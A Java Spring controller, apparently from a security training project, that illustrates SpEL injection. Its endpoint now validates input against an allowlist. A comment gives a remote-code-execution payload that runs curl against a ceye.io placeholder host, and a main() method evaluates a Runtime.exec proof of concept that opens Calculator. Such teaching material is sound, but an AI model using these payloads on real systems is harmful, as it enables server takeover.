package org.joychou.controller;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

import java.util.regex.Pattern;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * Allowlist pattern: only permit simple property names, string/number literals,
     * dots (property access), and basic arithmetic operators.
     * Blocks parentheses (method calls, T() type refs), # (variable refs),
     * @ (bean refs), { } (template expressions), and all other special characters.
     */
    private static final Pattern SAFE_SPEL_PATTERN =
            Pattern.compile("^[a-zA-Z0-9_.\\s'\"\\+\\-*/]+$");

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        // Validate expression against a strict allowlist to prevent SpEL injection.
        // Reject null/empty input and any expression containing characters that
        // could enable code execution (parentheses, #, @, etc.).
        if (expression == null || !SAFE_SPEL_PATTERN.matcher(expression).matches()) {
            return "Expression rejected: only simple property references and literals are allowed";
        }
        ExpressionParser parser = new SpelExpressionParser();
        return HtmlUtils.htmlEscape(parser.parseExpression(expression).getValue().toString());
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

